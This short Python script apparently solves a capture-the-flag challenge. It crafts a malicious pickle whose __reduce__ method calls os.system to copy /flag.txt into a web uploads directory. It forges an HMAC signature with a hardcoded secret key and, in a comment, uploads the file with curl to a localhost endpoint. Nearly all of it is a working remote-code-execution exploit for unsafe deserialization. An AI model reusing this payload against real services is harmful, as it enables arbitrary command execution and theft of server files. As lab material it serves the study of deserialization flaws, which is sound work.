# Attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

UPLOAD_DIR = "/app/app/uploads"
uuid = "45deb27a-9f4c-44a5-97a3-8cbeeaf42410"

class RCE:
    def __reduce__(self):
        return (os.system, (f"cat /flag.txt > {UPLOAD_DIR}/{uuid}/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")

# hacker then uploads the malicious.pkl file on the website
'''
curl -X POST http://localhost:916/upload \
  -F "file=@malicious.pkl" \
  -F "sig=d3f8bdfc1e23d6dab50105ead2bed3d55de116e6d588172a84ae9565c2ee800c"  # requires correct sig here
'''